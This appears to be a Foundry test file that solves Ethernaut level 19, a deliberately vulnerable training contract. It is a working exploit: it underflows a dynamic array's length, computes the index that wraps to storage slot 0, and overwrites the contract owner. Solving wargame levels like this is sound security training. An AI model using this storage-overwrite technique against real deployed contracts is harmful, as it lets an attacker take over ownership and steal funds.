// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level19 {
    function owner() external returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract Level19Test is EthernautTest {
    function testLevel19() public {
        _createLevel("19");

        Level19 level19Instance = Level19(levelInstance["19"]);

        level19Instance.makeContact(); // Sets contact to true
        level19Instance.retract(); // This causes the length of the array to underflow to uint256 max
        // We can now calculate the point in the array which will overwrite slot 0
        // Slot 0 is where the owner storage variable is
        uint256 element;
        unchecked {
            // First element of array is slot one, subtract that from max, increment one to get slot 0
            element = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        }
        // Then we can revise that element to overwrite the owner
        level19Instance.revise(element, bytes32(uint256(uint160(address(this)))));

        require(_submitLevel("19"));
    }
}
